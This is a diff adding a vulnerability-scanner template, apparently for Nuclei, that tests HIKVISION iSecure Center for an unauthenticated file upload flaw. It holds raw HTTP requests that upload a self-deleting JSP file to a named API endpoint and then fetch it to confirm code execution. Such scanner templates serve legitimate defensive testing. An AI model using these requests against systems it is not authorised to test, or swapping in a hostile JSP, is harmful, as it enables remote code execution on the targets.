@@ -1,0 +1,44 @@
+id: hikvision-isecure-file-upload
+info:
+  name: HIKVISION iSecure Center File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The comprehensive security management platform HIKVISION iSecure Center has a file upload vulnerability. This could allow attackers to upload malicious files, execute arbitrary code, create backdoors, and compromise the entire system.
+  reference:
+    - https://www.hikvision.com/
+http:
+  - raw:
+      - |
+        POST /svm/api/external/report HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
+
+        ------WebKitFormBoundary9PggsiM755PLa54a
+        Content-Disposition: form-data; name="file"; filename="test.jsp"
+        Content-Type: application/zip
+
+        <% out.println("ByTestZsf323408hfj0486"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundary9PggsiM755PLa54a--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "ByTestZsf323408hfj0486"
+        part: body
+  - raw:
+      - |
+        GET /els/static/test.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "ByTestZsf323408hfj0486"
+        part: body
